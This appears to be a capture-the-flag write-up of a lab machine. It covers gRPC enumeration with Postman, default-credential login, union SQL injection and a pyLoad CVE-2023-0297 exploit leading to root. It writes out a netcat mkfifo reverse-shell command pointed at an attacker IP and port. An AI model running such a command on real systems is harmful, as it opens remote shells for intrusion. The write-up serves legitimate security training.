This box involved working with a protocol I've never seen before. There was an open port which was difficult to enumerate. An error message revealed it was probably related to gRPC. Postman was used to interact with the port and server reflection revealed the endpoints. After logging in with default credentials a token was granted. This token unlocked the ability to interact with the ID endpoint. SQL injection was used to exploit the endpoint and extract user credentials. Root involved port forwarding to access an interal port which was hosting an outdated version of pyLoad. A root shell was returned after exploiting pyLoad.

# Inspecting port 50051
After checking the port it revealed an error message. The error message suggested that it was related to gRPC. I have no experience with gRPC and after googling I found Postman which is an application that can interact with it.

#### Netcat

Netcat revealed the error message caused by a timeout. This error message was key to figuring out what service was running.

# Port 50051 - gRPC - Postman
Postman was used to interact with gRPC. It was very simple to use and also supported server reflection which revealed all the endpoints automatically.

#### LoginUser endpoint
Token value of `b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODg3OTk4NDN9.dK4LZzBsKAQ9MhcaoeV87Dgkm3qjMSwLJ4Nsun05IMQ'` returned from logging in with admin:admin

#### GetInfo endpoint
Allowing Postman to use server reflection allows the methods to be automatically generated. it expects an ID parameter passed as JSON. Giving it any number always leads to the below message.

#### SQL Injection
It was possible to use union injection to extract the username using the below payload.

Modifying the initial payload to extract the password was also possible as shown below.

#### CVE-2023-0297
It did not take long to find a proof of concept for this vulnerability. The payload was a simple request. I decided to save the payload on the file system and execute it via bash to keep the request free from bad characters.

Source: https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
#### Payload

Created a file with below contents in /tmp 

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 9001 >/tmp/f`

Sent the below request to execute shell

```

Content-Length: 109
